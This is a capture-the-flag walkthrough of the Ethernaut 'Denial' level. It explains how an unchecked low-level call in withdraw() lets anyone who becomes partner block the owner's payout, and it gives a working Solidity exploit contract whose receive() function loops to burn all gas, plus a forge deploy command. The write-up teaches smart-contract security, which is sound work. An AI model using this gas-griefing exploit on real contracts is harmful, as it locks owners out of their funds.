@@ -1,0 +1,71 @@
+"This is a rather simple one and the objective is to prevent the owner from withdrawing the funds when they call the withdraw() function. Let's dive in.
+withdraw()
+Let's take a look at the vulnerable code:
+function setWithdrawPartner(address _partner) public {
+    partner = _partner;
+}
+
+function withdraw() public {
+    uint amountToSend = address(this).balance.div(100);
+    // perform a call without checking return
+    // The recipient can revert, the owner will still get their share
+    partner.call{value:amountToSend}("""");
+    owner.transfer(amountToSend);
+    // keep track of last withdrawal time
+    timeLastWithdrawn = now;
+    withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
+}
+
+The setWithdrawPartner() function is public and allows us to call it with our address so we can become a partner. 
+setWithdrawPartner()
+The withdraw() function is calculating the amount to send inside amountToSend and makes two external calls. One of the calls is made to the partner address which is controlled by us and the other one is made to the owner's address. These calls are transferring 1% Ether each to the owner and the partner. So the question is how can we prevent the owner from withdrawing?
+withdraw()
+amountToSend
+partner
+owner
+An interesting fact about the call() function is that it forwards all the gas along with the call unless a gas value is specified in the call. The transfer() and send() only forwards 2300 gas. 
+call()
+transfer()
+send()
+The call() returns two values, a bool success showing if the call succeeded and a bytes memory data which contains the return value. 
+It should be noted that the return values of the external calls are not checked anywhere. 
+call()
+bool success
+bytes memory data
+To exploit the contract and prevent the owner.transfer(amountToSend) from being called, we need to create a contract with a fallback or receive function that drains all the gas and prevents further execution of the withdraw() function. 
+owner.transfer(amountToSend)
+fallback
+receive
+withdraw()
+Here's how our exploit code looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel20.sol"";
+
+contract DenialHack {
+    Denial level20 = Denial(0x1bd442053Af3e571eBbe11809F3cd207A0466A45);
+
+    constructor() public {
+        level20.setWithdrawPartner(address(this));
+    }
+
+    receive() external payable {
+        while (true) {}
+    }
+}
+
+In the code shown above, we have created a constructor which is calling the setWithdrawPartner() to make the address of our deployed contract the partner. 
+setWithdrawPartner()
+A receive() function is also defined which has an infinite loop. This will help us in draining all the gas. 
+receive()
+We will deploy the contract using:
+forge create DenialHack --private-key $PKEY --rpc-url $RPC_URL
+
+
+The instance can now be submitted to finish the level. The owner will try to call the withdraw() function but the execution will go to our receive() function and will drain all the gas leading to a failed transaction. 
+withdraw()
+receive()
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
+Always check the return value of low-level calls, especially in cases where the called address is controlled by a third party. "
